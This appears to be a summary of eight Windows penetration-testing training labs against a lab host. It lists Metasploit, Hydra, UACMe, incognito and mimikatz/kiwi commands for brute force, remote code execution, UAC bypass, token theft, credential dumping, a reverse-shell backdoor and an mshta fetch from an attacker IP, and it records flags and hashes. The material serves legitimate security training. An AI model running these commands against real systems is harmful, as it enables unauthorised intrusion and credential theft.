# Windows Exploitation Labs — Summary

Target host throughout: **demo.ine.local**
Attacker: Kali Linux (some labs add a Windows "Attacker/Target" machine)

> Note: flags/hashes below are copied verbatim from the source PDF.

---

## Lab 1 — Windows: IIS Server: WebDav (Metasploit)
- **Target / OS:** Microsoft IIS httpd 10.0 — Windows
- **Service:** WebDAV (`/webdav`, basic auth `bob:password_123321`)
- **Tools:** Nmap, dirb, DAVTest, Cadaver, ASP Webshell, Metasploit

**Commands**
```
nmap demo.ine.local
nmap --script http-enum -sV -p 80 demo.ine.local
dirb demo.ine.local
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
shell
cd /
dir
type flag.txt
```
**Flag:** `d3aff16a801b4b7d36b4da1094bee345`

---

## Lab 2 — Windows: SMB Server PSexec
- **Target / OS:** Windows (SMB)
- **Tools:** Nmap, Metasploit (`smb_login`, `psexec`)

**Commands**
```
nmap -p445 --script smb-protocols demo.ine.local

msfconsole -q -x "use auxiliary/scanner/smb/smb_login; \
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt; \
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; \
 set RHOSTS demo.ine.local; \
 set VERBOSE false; \
 exploit"

msfconsole -q -x "use exploit/windows/smb/psexec; \
 set RHOSTS demo.ine.local; \
 set SMBUser Administrator; \
 set SMBPass <password>; \
 exploit"
```
**Flag:** (not shown in source)

---

## Lab 3 — Windows: Insecure RDP Service
- **Target / OS:** Windows Server 2012 R2 (also fingerprinted as 2008 R2 – 2012)
- **Service:** RDP on non-default port **3333**
- **Tools:** Nmap, Metasploit (`rdp_scanner`), Hydra, xfreerdp

**Commands**
```
ping -c 4 demo.ine.local
nmap -sV demo.ine.local
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
 -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
 rdp://demo.ine.local -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
```
**Flag:** `port-number-3333` (read from C:\flag)

---

## Lab 4 — WinRM Exploitation with Metasploit
- **Target / OS:** Windows — WinRM on port **5985** (wsman)
- **Tools:** Nmap, Metasploit (`winrm_login`, `winrm_auth_methods`, `winrm_cmd`, `winrm_script_exec`)

**Commands**
```
nmap --top-ports 7000 demo.ine.local
msfconsole -q

use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

cd /
dir
cat flag.txt
```
**Flag:** `3c716f95616eec677a7078f92657a230`
(Note: this exact WinRM lab/commands appears twice in the PDF under "WinRM: Exploitation with Metasploit".)

---

## Lab 5 — UAC Bypass: UACMe
- **Target / OS:** Windows Server 2012 R2 (6.3 Build 9600)
- **Initial foothold app:** Rejetto HTTP File Server (HFS) 2.3
- **Tools:** Nmap, searchsploit, Metasploit (`rejetto_hfs_exec`, `multi/handler`), msfvenom, UACMe (Akagi64.exe)

**Commands**
```
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
sysinfo
ps -S explorer.exe
migrate 2332
getsystem
shell
net localgroup administrators

# generate payload (replace LHOST with your IP)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
file backdoor.exe

# (Ctrl+C out of shell, back to meterpreter)
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

# second terminal: handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit

# back in first meterpreter
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

# in elevated session
ps -S lsass.exe
migrate 496
hashdump
```
**Admin NTLM Hash:** `4d6583ed4cef81c2f2ac3c88fc5f3da6`

---

## Lab 6 — Privilege Escalation: Impersonate
- **Target / OS:** Windows
- **Foothold app:** HFS 2.3 (runs as NT AUTHORITY\LOCAL SERVICE)
- **Tools:** Nmap, searchsploit, Metasploit (`rejetto_hfs_exec`), incognito extension

**Commands**
```
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt   # Access denied
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```
**Flag:** `x28c832a39730b7d46d6c38f1ea18e12`

---

## Lab 7 — Unattended Installation (Unattend.xml)
- **Target / OS:** Windows (Attacker Windows machine + Kali)
- **Technique:** Credentials in `C:\Windows\Panther\Unattend.xml`
- **Tools:** PowerSploit / PowerUp.ps1, PowerShell, runas, Metasploit (`hta_server`), mshta

**Commands**
```
# On Windows (Attacker) machine — PowerShell
whoami
cd .\Desktop\PowerSploit\Privesc\
ls
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
cat C:\Windows\Panther\Unattend.xml

# Decode base64 password
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password        # -> Admin@123

runas.exe /user:administrator cmd
# (enter password: Admin@123)
whoami

# On Kali
msfconsole -q
use exploit/windows/misc/hta_server
exploit

# On Target (admin cmd) — use your own HTA link
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta

# Back on Kali
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```
**Decoded password:** `Admin@123`
**Flag:** `097ab83639dce0ab3429cb0349493f60`

---

## Lab 8 — Windows: Meterpreter: Kiwi Extension
- **Target / OS:** Windows
- **Foothold app:** BadBlue 2.7
- **Tools:** Nmap, searchsploit, Metasploit (`badblue_passthru`), Kiwi (mimikatz) extension

**Commands**
```
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit badblue 2.7
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```
**Administrator NTLM Hash:** `e3c61a68f1b89ee6c8ba9507378dc88d`
**Student NTLM Hash:** `bd4ca1fbe028f3c5066467a7f6a73b0b`
**Syskey:** `377af0de68bdc918d22c57a263d38326`

---

## Quick Index
| # | Lab | Foothold / Service | Key technique |
|---|-----|--------------------|---------------|
| 1 | IIS WebDav | IIS 10 / WebDAV | ASP upload via Metasploit |
| 2 | SMB PSexec | SMB 445 | brute force + psexec |
| 3 | Insecure RDP | RDP on 3333 | Hydra + xfreerdp |
| 4 | WinRM | WinRM 5985 | winrm modules + script_exec |
| 5 | UAC Bypass | HFS 2.3 | UACMe (method 23) |
| 6 | Impersonate | HFS 2.3 | incognito token theft |
| 7 | Unattended Install | Unattend.xml | creds in answer file + HTA |
| 8 | Kiwi Extension | BadBlue 2.7 | mimikatz/kiwi credential dump |
